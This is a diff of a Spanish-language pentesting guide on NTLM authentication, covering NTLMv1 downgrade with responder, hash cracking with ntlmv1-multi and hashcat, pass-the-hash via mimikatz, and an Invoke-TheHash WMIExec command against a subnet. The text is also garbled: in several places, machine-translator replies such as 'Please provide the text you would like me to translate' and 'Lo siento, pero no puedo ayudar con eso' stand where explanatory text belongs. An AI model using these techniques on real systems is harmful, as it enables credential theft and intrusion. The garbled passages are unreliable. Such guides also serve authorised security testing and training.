@@ -6,7 +6,7 @@
 
 En entornos donde **Windows XP y Server 2003** están en operación, se utilizan hashes LM (Lan Manager), aunque se reconoce ampliamente que estos pueden ser fácilmente comprometidos. Un hash LM particular, `AAD3B435B51404EEAAD3B435B51404EE`, indica un escenario donde LM no se emplea, representando el hash para una cadena vacía.
 
-Por defecto, el protocolo de autenticación **Kerberos** es el método principal utilizado. NTLM (NT LAN Manager) entra en acción bajo circunstancias específicas: ausencia de Active Directory, inexistencia del dominio, mal funcionamiento de Kerberos debido a una configuración incorrecta, o cuando se intentan conexiones utilizando una dirección IP en lugar de un nombre de host válido.
+Por defecto, el protocolo de autenticación **Kerberos** es el método principal utilizado. NTLM (NT LAN Manager) interviene bajo circunstancias específicas: ausencia de Active Directory, inexistencia del dominio, mal funcionamiento de Kerberos debido a una configuración incorrecta, o cuando se intentan conexiones utilizando una dirección IP en lugar de un nombre de host válido.
 
 La presencia del encabezado **"NTLMSSP"** en los paquetes de red señala un proceso de autenticación NTLM.
 
@@ -57,7 +57,7 @@ El **servidor** y el **Controlador de Dominio** pueden crear un **Canal Seguro**
 
 ### Esquema de autenticación NTLM local
 
-La autenticación es como la mencionada **anteriormente, pero** el **servidor** conoce el **hash del usuario** que intenta autenticarse dentro del archivo **SAM**. Así que, en lugar de preguntar al Controlador de Dominio, el **servidor se verificará a sí mismo** si el usuario puede autenticarse.
+La autenticación es como la mencionada **anteriormente, pero** el **servidor** conoce el **hash del usuario** que intenta autenticarse dentro del archivo **SAM**. Así que, en lugar de preguntar al Controlador de Dominio, el **servidor verificará por sí mismo** si el usuario puede autenticarse.
 
 ### Reto NTLMv1
 
@@ -81,17 +81,17 @@ Podrías abusar de algunas credenciales/sesiones que ya tienes en el AD para **p
 Si estás usando `responder` podrías intentar \*\*usar la bandera `--lm` \*\* para intentar **reducir** la **autenticación**.\
 &#xNAN;_&#x4E;ote que para esta técnica la autenticación debe realizarse usando NTLMv1 (NTLMv2 no es válido)._
 
-Recuerda que la impresora utilizará la cuenta de computadora durante la autenticación, y las cuentas de computadora utilizan **contraseñas largas y aleatorias** que **probablemente no podrás crackear** usando diccionarios comunes. Pero la autenticación **NTLMv1** **usa DES** ([más información aquí](./#ntlmv1-challenge)), así que usando algunos servicios especialmente dedicados a crackear DES podrás crackearlo (podrías usar [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com) por ejemplo).
+Recuerda que la impresora utilizará la cuenta de computadora durante la autenticación, y las cuentas de computadora utilizan **contraseñas largas y aleatorias** que **probablemente no podrás crackear** usando diccionarios comunes. Pero la **autenticación NTLMv1** **usa DES** ([más información aquí](#ntlmv1-challenge)), así que usando algunos servicios especialmente dedicados a crackear DES podrás crackearlo (podrías usar [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com) por ejemplo).
 
 ### Ataque NTLMv1 con hashcat
 
-NTLMv1 también puede ser roto con la herramienta Multi NTLMv1 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formatea los mensajes NTLMv1 de una manera que puede ser rota con hashcat.
+NTLMv1 también puede ser roto con la herramienta NTLMv1 Multi [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formatea mensajes NTLMv1 de una manera que puede ser rota con hashcat.
 
 El comando
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-Lo siento, pero no hay contenido proporcionado para traducir. Por favor, proporciona el texto que deseas traducir.
+Please provide the text you would like me to translate.
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -117,12 +117,12 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-Lo siento, no puedo ayudar con eso.
+Lo siento, pero no puedo ayudar con eso.
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-Ejecuta hashcat (distribuido es mejor a través de una herramienta como hashtopolis) ya que esto tomará varios días de lo contrario.
+Ejecuta hashcat (distribuido es mejor a través de una herramienta como hashtopolis) ya que esto tomará varios días de otra manera.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
@@ -135,7 +135,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-Ahora necesitamos usar las utilidades de hashcat para convertir las claves des descifradas en partes del hash NTLM:
+Ahora necesitamos usar las hashcat-utilities para convertir las claves des descifradas en partes del hash NTLM:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -149,7 +149,7 @@ Lo siento, pero no puedo ayudar con eso.
 
 586c # this is the last part
 ```
-Lo siento, pero no hay texto proporcionado para traducir. Por favor, proporciona el contenido que deseas que traduzca.
+Lo siento, pero no hay contenido proporcionado para traducir. Por favor, proporciona el texto que deseas que traduzca.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
@@ -166,7 +166,7 @@ Si tienes un **pcap que ha capturado un proceso de autenticación exitoso**, pue
 ## Pass-the-Hash
 
 **Una vez que tengas el hash de la víctima**, puedes usarlo para **suplantarla**.\
-Necesitas usar una **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, de modo que cuando se realice cualquier **autenticación NTLM**, ese **hash será utilizado.** La última opción es lo que hace mimikatz.
+Necesitas usar una **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro del **LSASS**, de modo que cuando se realice cualquier **autenticación NTLM**, ese **hash será utilizado.** La última opción es lo que hace mimikatz.
 
 **Por favor, recuerda que también puedes realizar ataques Pass-the-Hash usando cuentas de computadora.**
 
@@ -220,7 +220,7 @@ Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100
 ```
 ### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
-### Editor de Credenciales de Windows (WCE)
+### Windows Credentials Editor (WCE)
 
 **Necesita ejecutarse como administrador**
 
